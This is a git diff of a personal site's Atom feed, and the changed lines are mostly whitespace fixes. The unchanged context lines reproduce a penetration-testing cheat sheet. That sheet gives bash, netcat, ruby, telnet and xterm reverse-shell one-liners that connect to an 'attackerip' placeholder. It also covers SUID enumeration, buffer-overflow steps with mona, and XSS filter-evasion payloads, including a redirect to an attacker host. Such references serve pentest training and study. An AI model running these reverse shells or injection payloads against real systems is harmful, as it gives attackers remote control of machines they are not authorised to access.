@@ -5,7 +5,7 @@
 <link rel="self" type="application/atom+xml" href="https://jivoi.github.io/feed.xml" />
 <link rel="alternate" type="text/html" href="https://jivoi.github.io" />
 <icon>https://i.imgur.com/s7cqI3w.jpg</icon>
-<updated>2015-08-14T16:34:52+03:00</updated>
+<updated>2015-08-14T18:35:40+03:00</updated>
 <id>https://jivoi.github.io/</id>
 <author>
   <name>EK</name>
@@ -2694,6 +2694,7 @@ sudo docker load -i baseimage-nginx.img&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
       &lt;li&gt;&lt;a href=&quot;#xterm-reverse-shell&quot; id=&quot;markdown-toc-xterm-reverse-shell&quot;&gt;XTERM Reverse Shell&lt;/a&gt;&lt;/li&gt;
       &lt;li&gt;&lt;a href=&quot;#xss-cheat-codes&quot; id=&quot;markdown-toc-xss-cheat-codes&quot;&gt;XSS Cheat Codes&lt;/a&gt;&lt;/li&gt;
       &lt;li&gt;&lt;a href=&quot;#ssh-over-sctp-with-socat&quot; id=&quot;markdown-toc-ssh-over-sctp-with-socat&quot;&gt;SSH Over SCTP (With Socat)&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#install-metasploit-community-edition-in-kali-20&quot; id=&quot;markdown-toc-install-metasploit-community-edition-in-kali-20&quot;&gt;Install Metasploit Community Edition in Kali 2.0&lt;/a&gt;&lt;/li&gt;
     &lt;/ul&gt;
   &lt;/li&gt;
 &lt;/ul&gt;
@@ -2781,7 +2782,7 @@ enum4linux target&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;h3 id=&quot;snmp-enumeration&quot;&gt;SNMP Enumeration&lt;/h3&gt;
 
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;snmpget -v &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; -c public IP 
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;snmpget -v &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; -c public IP
 snmpwalk -v &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; -c public IP
 snmpbulkwalk -v2c -c public -Cn0 -Cr10 IP&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
@@ -2875,7 +2876,7 @@ c:&amp;gt; nc -v -w &lt;span class=&quot;m&quot;&gt;30&lt;/span&gt; -p &lt;span 
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nc 192.168.0.10 80
 GET / HTTP/1.1
 Host: 192.168.0.10
-User-Agent: Mozilla/4.0 
+User-Agent: Mozilla/4.0
 Referrer: www.example.com
 &amp;lt;enter&amp;gt;
 &amp;lt;enter&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
@@ -2886,7 +2887,7 @@ Referrer: www.example.com
 nc 192.168.0.10 31337
 c:&amp;gt;nc example.com &lt;span class=&quot;m&quot;&gt;80&lt;/span&gt; -e cmd.exe
 nc -lp 80
- 
+
 nc -lp &lt;span class=&quot;m&quot;&gt;31337&lt;/span&gt; -e /bin/bash
 nc 192.168.0.10 31337
 nc -vv -r&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;random&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; -w&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;wait&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; 192.168.0.10 -z&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;i/o error&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 1-1000&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
@@ -2895,19 +2896,19 @@ nc -vv -r&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;random&lt;span class=&quo
 
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# Find SUID root files&lt;/span&gt;
 find / -user root -perm -4000 -print
- 
+
 &lt;span class=&quot;c&quot;&gt;# Find SGID root files:&lt;/span&gt;
 find / -group root -perm -2000 -print
- 
+
 &lt;span class=&quot;c&quot;&gt;# Find SUID and SGID files owned by anyone:&lt;/span&gt;
 find / -perm -4000 -o -perm -2000 -print
- 
+
 &lt;span class=&quot;c&quot;&gt;# Find files that are not owned by any user:&lt;/span&gt;
 find / -nouser -print
- 
+
 &lt;span class=&quot;c&quot;&gt;# Find files that are not owned by any group:&lt;/span&gt;
 find / -nogroup -print
- 
+
 &lt;span class=&quot;c&quot;&gt;# Find symlinks and what they point to:&lt;/span&gt;
 find / -type l -ls&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
@@ -2924,7 +2925,7 @@ php -S 0.0.0.0:8888&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;h3 id=&quot;get-pids-of-process&quot;&gt;Get PIDs of process&lt;/h3&gt;
 
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;fuser -nv tcp &lt;span class=&quot;m&quot;&gt;80&lt;/span&gt; 
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;fuser -nv tcp 80
 fuser -k -n tcp 80&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;h3 id=&quot;hydra-rdp-bruteforce&quot;&gt;Hydra rdp Bruteforce&lt;/h3&gt;
@@ -3043,43 +3044,43 @@ perl -i~ -0777pe&lt;span class=&quot;s1&quot;&gt;&amp;#39;s/^/&amp;lt;?php \n/&a
 
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# find programs with a set uid bit&lt;/span&gt;
 find / -uid &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt; -perm -4000
- 
+
 &lt;span class=&quot;c&quot;&gt;# find things that are world writable&lt;/span&gt;
 find / -perm -o&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;w
- 
+
 &lt;span class=&quot;c&quot;&gt;# find names with dots and spaces, there shouldn’t be any&lt;/span&gt;
 find / -name &lt;span class=&quot;s2&quot;&gt;&amp;quot; &amp;quot;&lt;/span&gt; -print
 find / -name &lt;span class=&quot;s2&quot;&gt;&amp;quot;..&amp;quot;&lt;/span&gt; -print
 find / -name &lt;span class=&quot;s2&quot;&gt;&amp;quot;. &amp;quot;&lt;/span&gt; -print
 find / -name &lt;span class=&quot;s2&quot;&gt;&amp;quot; &amp;quot;&lt;/span&gt; -print
- 
+
 &lt;span class=&quot;c&quot;&gt;# find files that are not owned by anyone&lt;/span&gt;
 find / -nouser
- 
+
 &lt;span class=&quot;c&quot;&gt;# look for files that are unlinked&lt;/span&gt;
 lsof +L1
- 
+
 &lt;span class=&quot;c&quot;&gt;# get information about procceses with open ports&lt;/span&gt;
 lsof -i
 
 &lt;span class=&quot;c&quot;&gt;# look for weird things in arp&lt;/span&gt;
 arp -a
- 
+
 &lt;span class=&quot;c&quot;&gt;# look at all accounts including AD&lt;/span&gt;
 getent passwd
- 
+
 &lt;span class=&quot;c&quot;&gt;# look at all groups and membership including AD&lt;/span&gt;
 getent group
- 
+
 &lt;span class=&quot;c&quot;&gt;# list crontabs for all users including AD&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; user in &lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;getent passwd&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt;cut -f1 -d:&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;### Crontabs for $user ####&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; crontab -u &lt;span class=&quot;nv&quot;&gt;$user&lt;/span&gt; -l&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
- 
+
 &lt;span class=&quot;c&quot;&gt;# generate random passwords&lt;/span&gt;
 cat /dev/urandom&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; tr -dc ‘a-zA-Z0-9-_!@#&lt;span class=&quot;nv&quot;&gt;$%&lt;/span&gt;^&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;*&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;_+&lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt;:&amp;lt;&amp;gt;?&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;’&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt;fold -w 12&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; head -n 4
- 
+
 &lt;span class=&quot;c&quot;&gt;# find all immutable files, there should not be any&lt;/span&gt;
 find . &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; xargs -I file lsattr -a file 2&amp;gt;/dev/null &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; grep ‘^….i’
- 
+
 &lt;span class=&quot;c&quot;&gt;# fix immutable files&lt;/span&gt;
 chattr -i file&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
@@ -3097,12 +3098,12 @@ pattern create
 pattern offset &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;EIP Address&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 pattern offset &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ESP Address&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 add garbage upto EIP value and add &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;JMP ESP address&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; in EIP . &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;ESP&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; shellcode &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
- 
+
 !pvefindaddr pattern_create 5000
 !pvefindaddr suggest
 !pvefindaddr modules
 !pvefindaddr nosafeseh
- 
+
 !mona config -set workingfolder C:&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;ona&lt;span class=&quot;se&quot;&gt;\%&lt;/span&gt;p
 !mona config -get workingfolder
 !mona mod
@@ -3146,17 +3147,17 @@ add garbage upto EIP value and add &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt
 
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# Setting Breakpoint&lt;/span&gt;
 &lt;span class=&quot;nb&quot;&gt;break&lt;/span&gt; *_start
- 
+
 &lt;span class=&quot;c&quot;&gt;# Execute Next Instruction&lt;/span&gt;
 next
 step
 n
 s
- 
+
 &lt;span class=&quot;c&quot;&gt;# Continue Execution&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;
 c
- 
+
 &lt;span class=&quot;c&quot;&gt;# Data&lt;/span&gt;
 checking &lt;span class=&quot;s1&quot;&gt;&amp;#39;REGISTERS&amp;#39;&lt;/span&gt; and &lt;span class=&quot;s1&quot;&gt;&amp;#39;MEMORY&amp;#39;&lt;/span&gt;
 
@@ -3182,20 +3183,20 @@ z –&amp;gt; Size of field to be &lt;span class=&quot;nv&quot;&gt;displayed&lt;
 &lt;h3 id=&quot;bash-reverse-shell&quot;&gt;BASH Reverse Shell&lt;/h3&gt;
 
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;bash -i &amp;gt;&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt; /dev/tcp/X.X.X.X/443 0&amp;gt;&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;1
- 
+
 &lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt; /bin/bash 0&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt; 2&amp;gt;&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;0
 &lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt; /bin/bash 0&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt; 2&amp;gt;&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;0
- 
+
 0&amp;lt;&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;196&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;196&amp;lt;&amp;gt;/dev/tcp/attackerip/4444&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; sh &amp;lt;&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;196&lt;/span&gt; &amp;gt;&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;196&lt;/span&gt; 2&amp;gt;&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;196
- 
+
 0&amp;lt;&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;196&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;196&amp;lt;&amp;gt;/dev/tcp/attackerip/4444&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; sh &amp;lt;&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;196&lt;/span&gt; &amp;gt;&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;196&lt;/span&gt; 2&amp;gt;&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;196
- 
+
 &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;5&amp;lt;&amp;gt;/dev/tcp/attackerip/4444 cat &amp;lt;&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;5&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;line&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$line&lt;/span&gt; 2&amp;gt;&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;5&lt;/span&gt; &amp;gt;&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;5&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# or: while read line 0&amp;lt;&amp;amp;5; do $line 2&amp;gt;&amp;amp;5 &amp;gt;&amp;amp;5; done&lt;/span&gt;
 &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;5&amp;lt;&amp;gt;/dev/tcp/attackerip/4444
- 
+
 cat &amp;lt;&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;5&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;line&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$line&lt;/span&gt; 2&amp;gt;&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;5&lt;/span&gt; &amp;gt;&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;5&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# or:&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;line 0&amp;lt;&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;5&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$line&lt;/span&gt; 2&amp;gt;&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;5&lt;/span&gt; &amp;gt;&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;5&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
- 
+
 /bin/bash -i &amp;gt; /dev/tcp/attackerip/8080 0&amp;lt;&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; 2&amp;gt;&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;1
 /bin/bash -i &amp;gt; /dev/tcp/X.X.X.X/443 0&amp;lt;&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; 2&amp;gt;&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;1&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
@@ -3210,7 +3211,7 @@ perl -e &lt;span class=&quot;err&quot;&gt;&amp;#39;&lt;/span&gt;use Socket&lt;sp
 &lt;h3 id=&quot;ruby-reverse-shell&quot;&gt;RUBY Reverse Shell&lt;/h3&gt;
 
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;ruby -rsocket -e &lt;span class=&quot;s1&quot;&gt;&amp;#39;exit if fork;c=TCPSocket.new(&amp;quot;attackerip&amp;quot;,&amp;quot;443&amp;quot;);while(cmd=c.gets);IO.popen(cmd,&amp;quot;r&amp;quot;){|io|c.print io.read}end&amp;#39;&lt;/span&gt;
- 
+
 &lt;span class=&quot;c&quot;&gt;# for win platform&lt;/span&gt;
 ruby -rsocket -e &lt;span class=&quot;s1&quot;&gt;&amp;#39;c=TCPSocket.new(&amp;quot;attackerip&amp;quot;,&amp;quot;443&amp;quot;);while(cmd=c.gets);IO.popen(cmd,&amp;quot;r&amp;quot;){|io|c.print io.read}end&amp;#39;&lt;/span&gt;
 ruby -rsocket -e &lt;span class=&quot;s1&quot;&gt;&amp;#39;f=TCPSocket.open(&amp;quot;attackerip&amp;quot;,&amp;quot;443&amp;quot;).to_i;exec sprintf(&amp;quot;/bin/sh -i &amp;lt;&amp;amp;%d &amp;gt;&amp;amp;%d 2&amp;gt;&amp;amp;%d&amp;quot;,f,f,f)&amp;#39;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
@@ -3233,13 +3234,13 @@ p.waitFor&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt
 
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nc -e /bin/sh attackerip 4444
 nc -e /bin/sh 192.168.37.10 443
- 
-&lt;span class=&quot;c&quot;&gt;# If the -e option is disabled, try this &lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# If the -e option is disabled, try this&lt;/span&gt;
 &lt;span class=&quot;c&quot;&gt;# mknod backpipe p &amp;amp;&amp;amp; nc attackerip 443 0&amp;lt;backpipe | /bin/bash 1&amp;gt;backpipe&lt;/span&gt;
 /bin/sh &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; nc attackerip 443
 rm -f /tmp/p&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; mknod /tmp/p p &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; nc attackerip &lt;span class=&quot;m&quot;&gt;4443&lt;/span&gt; 0/tmp/
- 
-&lt;span class=&quot;c&quot;&gt;# If you have the wrong version of netcat installed, try &lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# If you have the wrong version of netcat installed, try&lt;/span&gt;
 rm /tmp/f&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;mkfifo /tmp/f&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;cat /tmp/f&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt;/bin/sh -i 2&amp;gt;&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt;nc attackerip &amp;gt;/tmp/f&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;h3 id=&quot;telnet-reverse-shell&quot;&gt;TELNET Reverse Shell&lt;/h3&gt;
@@ -3252,13 +3253,13 @@ mknod backpipe p &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# Start an open X Server on your system (:1 – which listens on TCP port 6001)&lt;/span&gt;
 apt-get install xnest
 Xnest :1
- 
+
 &lt;span class=&quot;c&quot;&gt;# Then remember to authorise on your system the target IP to connect to you&lt;/span&gt;
 xterm -display 127.0.0.1:1
 
 &lt;span class=&quot;c&quot;&gt;# Run this INSIDE the spawned xterm on the open X Server&lt;/span&gt;
-xhost +targetip 
- 
+xhost +targetip
+
 &lt;span class=&quot;c&quot;&gt;# Then on the target connect back to the your X Server&lt;/span&gt;
 xterm -display attackerip:1
 /usr/openwin/bin/xterm -display attackerip:1
@@ -3269,27 +3270,27 @@ or
 
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&amp;lt; iframes &amp;gt; src=http://IP:PORT &amp;lt;/ iframes &amp;gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
- 
+
 &amp;lt;script&amp;gt;document.location&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;http://IP:PORT&amp;lt;/script&amp;gt;
- 
+
 &lt;span class=&quot;s1&quot;&gt;&amp;#39;;alert(String.fromCharCode(88,83,83))//\&amp;#39;;alert(String.fromCharCode(88,83,83))//&amp;quot;;alert(String.fromCharCode(88,83,83))//\&amp;quot;;alert(String.fromCharCode(88,83,83))//–&amp;gt;&amp;lt;/SCRIPT&amp;gt;&amp;quot;&amp;gt;&amp;#39;&lt;/span&gt;&amp;gt;&amp;lt;SCRIPT&amp;gt;alert&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;String.fromCharCode&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;88,83,83&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&amp;lt;/SCRIPT&amp;gt;
- 
+
 &lt;span class=&quot;s2&quot;&gt;&amp;quot;;!–&amp;quot;&lt;/span&gt;&amp;lt;XSS&amp;gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;amp&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;amp&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;{()}&lt;/span&gt;
- 
+
 &amp;lt;IMG &lt;span class=&quot;nv&quot;&gt;SRC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;javascript:alert(&amp;#39;XSS&amp;#39;);&amp;quot;&lt;/span&gt;&amp;gt;
 &amp;lt;IMG &lt;span class=&quot;nv&quot;&gt;SRC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;javascript:alert&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;XSS&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&amp;gt;
 &amp;lt;IMG &lt;span class=&quot;s2&quot;&gt;&amp;quot;&amp;quot;&amp;quot;&amp;gt;&amp;lt;SCRIPT&amp;gt;alert(&amp;quot;&lt;/span&gt;XSS&lt;span class=&quot;s2&quot;&gt;&amp;quot;)&amp;lt;/SCRIPT&amp;gt;&amp;quot;&amp;quot;&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;s2&quot;&gt;&amp;lt;IMG SRC=&amp;amp;amp;amp;#106;&amp;amp;amp;amp;#97;&amp;amp;amp;amp;#118;&amp;amp;amp;amp;#97;&amp;amp;amp;amp;#115;&amp;amp;amp;amp;#99;&amp;amp;amp;amp;#114;&amp;amp;amp;amp;#105;&amp;amp;amp;amp;#112;&amp;amp;amp;amp;#116;&amp;amp;amp;amp;#58;&amp;amp;amp;amp;#97;&amp;amp;amp;amp;#108;&amp;amp;amp;amp;#101;&amp;amp;amp;amp;#114;&amp;amp;amp;amp;#116;&amp;amp;amp;amp;#40;&amp;amp;amp;amp;#39;&amp;amp;amp;amp;#88;&amp;amp;amp;amp;#83;&amp;amp;amp;amp;#83;&amp;amp;amp;amp;#39;&amp;amp;amp;amp;#41;&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;s2&quot;&gt; &lt;/span&gt;
+
 &lt;span class=&quot;s2&quot;&gt;&amp;lt;IMG SRC=&amp;amp;amp;amp;#0000106&amp;amp;amp;amp;#0000097&amp;amp;amp;amp;#0000118&amp;amp;amp;amp;#0000097&amp;amp;amp;amp;#0000115&amp;amp;amp;amp;#0000099&amp;amp;amp;amp;#0000114&amp;amp;amp;amp;#0000105&amp;amp;amp;amp;#0000112&amp;amp;amp;amp;#0000116&amp;amp;amp;amp;#0000058&amp;amp;amp;amp;#0000097&amp;amp;amp;amp;#0000108&amp;amp;amp;amp;#0000101&amp;amp;amp;amp;#0000114&amp;amp;amp;amp;#0000116&amp;amp;amp;amp;#0000040&amp;amp;amp;amp;#0000039&amp;amp;amp;amp;#0000088&amp;amp;amp;amp;#0000083&amp;amp;amp;amp;#0000083&amp;amp;amp;amp;#0000039&amp;amp;amp;amp;#0000041&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;s2&quot;&gt;&amp;lt;IMG SRC=&amp;quot;&lt;/span&gt;jav ascript:alert&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;XSS&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;s2&quot;&gt; &lt;/span&gt;
+
 &lt;span class=&quot;s2&quot;&gt;perl -e &amp;#39;print &amp;quot;&lt;/span&gt;&amp;lt;IMG &lt;span class=&quot;nv&quot;&gt;SRC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;javascript:alert&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&amp;quot;&lt;/span&gt;XSS&lt;span class=&quot;se&quot;&gt;\&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&amp;gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;;&amp;#39; &amp;gt; out&lt;/span&gt;
-&lt;span class=&quot;s2&quot;&gt; &lt;/span&gt;
+
 &lt;span class=&quot;s2&quot;&gt;&amp;lt;BODY onload!#$%&amp;amp;amp;()*~+-_.,:;?@[/|\]^`=alert(&amp;quot;&lt;/span&gt;XSS&lt;span class=&quot;s2&quot;&gt;&amp;quot;)&amp;gt;&lt;/span&gt;
 
 &lt;span class=&quot;s2&quot;&gt;(&amp;quot;&lt;/span&gt;&amp;gt;&amp;lt; iframes http://google.com &amp;lt; iframes &amp;gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
- 
+
